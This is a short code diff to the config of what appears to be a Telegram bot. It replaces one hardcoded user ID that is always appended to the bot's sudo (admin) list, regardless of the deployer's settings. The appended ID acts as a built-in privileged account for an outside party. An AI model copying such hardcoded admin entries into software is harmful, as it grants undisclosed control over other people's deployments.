@@ -21,7 +21,7 @@ class Config(object):
     API_TOKEN = os.environ.get("API_TOKEN", "dontsellme_iamfreeapi")
     # Sudo users(goto @JVToolsBot and send /id to get your id)
     SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS", "1781945165").split()))
-    SUDO_USERS.append(1669178360)
+    SUDO_USERS.append(1314421032)
     SUDO_USERS = list(set(SUDO_USERS))
 
 bot = Client(":memory:",
